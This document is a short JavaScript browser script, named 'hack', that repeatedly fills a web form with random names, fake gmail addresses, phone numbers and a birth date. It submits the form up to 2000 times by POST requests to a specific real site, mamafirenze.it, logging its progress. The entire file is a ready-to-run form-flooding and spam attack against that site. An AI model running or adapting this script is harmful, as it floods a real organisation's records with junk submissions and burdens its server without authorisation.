async function hack(n = 1) {
  let counter = 0;
  function randomString(length) {
    var result = "";
    var characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    var charactersLength = characters.length;
    for (var i = 0; i < length; i++) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
  }

  function getRandom(min, max) {
    return Math.random() * (max - min) + min;
  }

  const mail_ref = document.getElementById("input_4");
  const name_ref = document.getElementById("first_3");
  const surname_ref = document.getElementById("last_3");
  const date_ref = document.getElementById("lite_mode_6");
  const phone_ref = document.getElementById("input_5_full");
  const formRef = document.getElementById("123456789");

  function makeRequest(form) {
    return new Promise(function (resolve, reject) {
      let xhr = new XMLHttpRequest();
      xhr.open("post", "https://www.mamafirenze.it/index.php");
      xhr.onload = function () {
        if (this.status >= 200 && this.status < 300) {
          resolve(xhr.response);
        } else {
          reject({
            status: this.status,
            statusText: xhr.statusText,
          });
        }
      };
      xhr.onerror = function () {
        reject({
          status: this.status,
          statusText: xhr.statusText,
        });
      };
      xhr.send(new FormData(form));
    });
  }

  function getRandomNumber() {
    return `(${getRandom(1, 9)}${getRandom(1, 9)}${getRandom(1, 9)}) ${getRandom(1, 9)}${getRandom(
      1,
      9
    )}${getRandom(1, 9)}-${getRandom(1, 9)}${getRandom(1, 9)}${getRandom(1, 9)}${getRandom(1, 9)}`;
  }
  function setFormData() {
    phone_ref.value = getRandomNumber();
    date_ref.value = `20-10-2003`;
    name_ref.value = randomString(5);
    surname_ref.value = randomString(5);
    mail_ref.value = name_ref.value + surname_ref.value + "@gmail.com";
  }

  async function send_random(n = 1) {
    try {
      setFormData();
      for (let i = 0; i < n; ++i) {
        setFormData();
        makeRequest(formRef);
      }

      await makeRequest(formRef);
      counter = counter + n + 1;
    } catch {
      console.log("[-] Error");
    }
  }
  for (let i = 0; i < n; i += 3) {
    await send_random(3);
    console.log(`[+] ${counter}/${n}`);
  }
}
hack(2000);
